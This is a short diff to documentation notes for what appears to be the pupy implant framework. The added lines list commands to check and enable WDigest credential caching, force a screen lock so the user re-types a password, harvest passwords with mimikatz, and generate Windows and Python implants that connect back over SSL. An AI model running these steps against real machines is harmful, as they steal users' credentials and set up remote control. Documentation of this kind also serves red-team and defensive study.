@@ -80,10 +80,29 @@ pupy calls the implants clients. Clients are generated with the `gen` command
 
 NOTE: TODO
 
+  mimikatz --wdigest check
+
+Check to see if WDigest is enabled via the `UseLogonCredential` registry key.
+
+  mimikatz --wdigest enable
+
+Enable WDigest if it's not enabled.
+
+  lock_screen
+
+Force the screen to lock and the user to reenter creds. This needs to be run as the logged in user, not NT AUTHORITY\\SYSTEM.
+
+  mimikatz
+
+Use mimikatz to run `loginPasswords` and add any passwords found, via WDigest or otherwise, to `creds`.
+
 ==== Common snippets
 
   gen -f py_oneliner -O linux -A x64 connect -t ssl --host localhost:443
 
-Genrate a python oneliner
+Generate a python oneliner
 
+  gen -f client -O windows -A x64 -o /tmp/pupy.exe connect -t ssl --host localhost:443 --host localhost:8443
+
+Generate an executable for windows
 <<<
